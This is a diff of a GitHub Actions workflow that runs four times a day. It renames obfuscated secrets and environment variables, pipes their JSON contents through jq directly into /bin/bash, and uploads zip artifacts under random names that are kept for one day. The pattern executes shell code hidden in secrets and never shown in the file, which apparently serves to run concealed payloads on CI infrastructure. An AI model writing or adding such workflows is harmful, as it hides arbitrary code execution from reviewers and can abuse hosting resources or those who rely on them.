@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '10 1,7,13,19 * * *'
+    - cron: '6 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,18 +18,17 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          xiev17258: ${{ secrets.xiev17258 }}
+          zspus09: ${{ secrets.zspus09 }}
         run: |
-          printf '%s' "$xiev17258" | jq -r .n6516 | /bin/bash
-          echo $ugku0788 | jq -r .kang068 | /bin/bash
-          echo $mj77 | jq -r .lq89265 | /bin/bash
-          printf '%s' "$ow7" | jq -r .iwah51210 | /bin/bash
-          printf '%s' "$a2861" | jq -r .pin29 | /bin/bash
+          printf '%s' "$zspus09" | jq -r .eejqu2796 | /bin/bash
+          echo $laqa5198 | jq -r .fasic39 | /bin/bash
+          echo $zgi3 | jq -r .r77 | /bin/bash
+          printf '%s' "$mk0168" | jq -r .tzl70 | /bin/bash
 
       - name: Upload results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: NiirYlOH
+          name: sNYwBsGz
           path: "*.zip"
           retention-days: 1
